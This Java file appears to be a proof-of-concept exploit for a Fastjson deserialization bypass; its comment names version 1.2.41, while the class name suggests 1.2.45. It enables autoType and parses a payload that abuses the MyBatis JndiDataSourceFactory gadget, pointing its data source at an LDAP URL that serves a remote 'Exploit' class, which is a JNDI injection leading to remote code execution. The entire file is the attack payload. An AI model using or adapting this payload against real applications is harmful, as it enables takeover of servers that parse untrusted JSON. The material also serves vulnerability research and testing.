import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

// Fastjson 1.2.41 版本的绕过
public class SuccessBypassEXP_45 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +
                "\"properties\":{\"data_source\":\"ldap://localhost:1234/Exploit\"}}";
        JSON.parse(payload);
    }
}
